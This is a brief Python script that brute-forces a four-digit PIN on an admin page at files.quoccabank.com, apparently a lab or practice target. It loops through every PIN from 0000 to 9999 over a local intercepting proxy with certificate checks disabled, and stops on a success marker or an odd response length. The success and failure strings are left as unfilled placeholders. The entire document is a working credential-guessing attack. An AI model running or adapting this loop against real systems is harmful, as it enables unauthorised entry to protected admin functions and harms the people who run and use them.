import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

s = requests.session()
s.verify = False
s.proxies = {"https": "http://127.0.0.1:8080"}


url = "https://files.quoccabank.com/admin"

#try all combinations from 0000 to 9999
for i in range(10000):
    # Format the pin to be 4-digit string, padded w zeros if necessary
    pin = f"{i:04d}"

    #try it
    print(f"Trying PIN code: {pin}")
    post_data = {'pin': pin}
    r = s.post(url, data=post_data)

    # If successful, break loop
    if 'success condition' in r.text:
        print(f"Success with PIN code: {pin}")
        break
    elif '<specific failed attempt message>' in r.text:
        pass
    else:
        # not success/known failure
        print(f"Unexpected response for PIN code: {pin}")
        if len(r.text) != 198:
            print(f"this one!: {pin}")
            exit()